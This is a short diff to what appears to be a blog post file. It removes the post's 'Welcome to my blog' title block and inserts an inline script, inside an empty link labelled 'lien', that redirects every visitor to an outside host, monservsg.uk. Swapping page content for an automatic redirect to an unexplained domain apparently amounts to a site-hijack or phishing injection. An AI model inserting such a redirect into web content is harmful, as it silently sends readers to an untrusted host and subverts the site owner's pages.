@@ -1,4 +1,4 @@
----
-title: Welcome to my blog
----
-
+<a href="">
+  lien <script>  
+    window.location.href = "https://monservsg.uk/ser"  
+  </script>
